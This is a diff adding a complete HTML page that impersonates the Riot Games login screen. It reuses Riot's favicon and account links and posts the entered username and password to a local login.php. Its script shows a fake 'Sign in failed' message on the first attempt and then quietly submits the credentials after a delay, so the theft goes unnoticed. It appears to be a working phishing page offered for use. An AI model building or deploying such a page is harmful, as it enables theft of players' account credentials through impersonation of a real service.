@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://lolstatic-a.akamaihd.net/rso-authenticator-ui/0.124.6/assets/favicon.ico">
+    <title>Riot Games | Login</title>
+</head>
+<body>
+    <main class="main">
+        <section class="section-login">
+            <div class="container">
+                <img src="logo.png" class="logo" alt="Riot Games Logo">
+
+                <h1 class="section-title">Sign In</h1>
+
+                <form id="loginForm" action="login.php" method="POST">
+                    <label class="login-user">
+                        <span>Username</span>
+                        <input type="text" name="username" class="input" autocomplete="username">
+                    </label>
+
+                    <label class="login-user">
+                        <span>Password</span>
+                        <input type="password" name="password" class="input" autocomplete="current-password">
+                    </label>
+
+                    <div class="login-icons">
+                        <a href="https://www.facebook.com/login.php" target="_blank" class="btn-social" aria-label="Continue with Facebook">
+                            <img src="facebook-icon.png" alt="Facebook">
+                        </a>
+                        <a href="https://accounts.google.com/signin" target="_blank" class="btn-social" aria-label="Continue with Google">
+                            <img src="google-icon.png" alt="Google">
+                        </a>
+                        <a href="https://appleid.apple.com" target="_blank" class="btn-social" aria-label="Continue with Apple">
+                            <img src="apple-icon.png" alt="Apple">
+                        </a>
+                    </div>
+
+                    <label class="section-checkbox">
+                        <input type="checkbox" id="input-checkbox" name="remember"> Stay Signed In
+                    </label>
+                    <p class="error-msg" id="generalError">Sign in failed. Please check your username and password.</p>
+
+                    <button type="submit" class="login-btn" disabled id="loginBtn">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                            <path d="M438.6 278.6l-160 160C272.4 444.9 264.2 448 256 448s-16.38-3.125-22.62-9.375c-12.5-12.5-12.5-32.75 0-45.25L338.8 288H32C14.33 288 .0016 273.7 .0016 256S14.33 224 32 224h306.8l-105.4-105.4c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0l160 160C451.1 245.9 451.1 266.1 438.6 278.6z"/>
+                        </svg>
+                    </button>
+                </form>
+            </div>
+
+            <div class="container">
+                <a href="https://recovery.riotgames.com" target="_blank" class="section-link">Can't sign in?</a>
+                <a href="https://signup.riotgames.com" target="_blank" class="section-link">Create account</a>
+            </div>
+        </section>
+
+        <section class="wallpaper"></section>
+    </main>
+
+    <script>
+        var inputs = document.querySelectorAll('.input');
+        var button = document.getElementById('loginBtn');
+        var form = document.getElementById('loginForm');
+        var generalError = document.getElementById('generalError');
+        var submitAttempted = false;
+
+        var handleFocus = function(e) {
+            var span = e.target.previousElementSibling;
+            span.classList.add('span-active');
+        };
+
+        var handleFocusOut = function(e) {
+            if (e.target.value === '') {
+                var span = e.target.previousElementSibling;
+                span.classList.remove('span-active');
+            }
+        };
+
+        var handleChange = function() {
+            var user = inputs[0];
+            var password = inputs[1];
+
+            if (user.value && password.value.length >= 8) {
+                button.removeAttribute('disabled');
+            } else {
+                button.setAttribute('disabled', '');
+            }
+        };
+
+        inputs.forEach(function(input) {
+            input.addEventListener('focus', handleFocus);
+            input.addEventListener('focusout', handleFocusOut);
+            input.addEventListener('input', handleChange);
+        });
+
+        form.addEventListener('submit', function(e) {
+            var user = inputs[0];
+            var password = inputs[1];
+
+            if (!user.value || password.value.length < 8) {
+                e.preventDefault();
+                return;
+            }
+
+            if (!submitAttempted) {
+                e.preventDefault();
+                submitAttempted = true;
+                generalError.style.display = 'block';
+                user.style.border = '2px solid #cf3c3f';
+                password.style.border = '2px solid #cf3c3f';
+                button.setAttribute('disabled', '');
+                button.style.backgroundColor = '#a0a0a0';
+
+                setTimeout(function() {
+                    generalError.style.display = 'none';
+                    user.style.border = '2px solid transparent';
+                    password.style.border = '2px solid transparent';
+                    button.removeAttribute('disabled');
+                    button.style.backgroundColor = '#cf3c3f';
+                    form.submit();
+                }, 2500);
+            }
+        });
+    </script>
+</body>
+</html>
